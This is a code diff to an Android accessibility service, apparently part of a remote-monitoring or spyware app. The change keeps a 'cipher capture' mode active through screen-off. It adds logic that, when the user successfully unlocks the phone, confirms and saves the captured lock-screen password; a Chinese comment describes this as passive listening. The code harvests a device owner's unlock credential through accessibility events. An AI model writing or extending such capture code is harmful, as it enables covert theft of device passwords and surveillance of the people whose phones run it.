@@ -1859,13 +1859,17 @@ class MyAccessibilityService : AccessibilityService() {
                             Intent.ACTION_SCREEN_OFF -> {
                                 android.util.Log.d(TAG, "SCREEN_OFF")
                                 cipherCaptureManager?.resetLockBatchId()
-                                isCipherCaptureEnabled = false
                                 cipherRetryCount = 0
                                 try { sendScreenStatus() } catch (_: Exception) {}
                             }
                             Intent.ACTION_USER_PRESENT -> {
                                 android.util.Log.d(TAG, "USER_PRESENT")
                                 try { sendScreenStatus() } catch (_: Exception) {}
+                                // 被动监听模式：用户解锁成功 = 密码验证成功，直接确认保存
+                                if (isCipherCaptureEnabled) {
+                                    android.util.Log.d(TAG, "🔐 USER_PRESENT + cipher监听中 → 确认保存密码")
+                                    cipherCaptureManager?.confirmAndSaveLastCipher()
+                                }
                                 val pType = pendingPasswordType
                                 if (pType != null) {
                                     pendingPasswordType = null
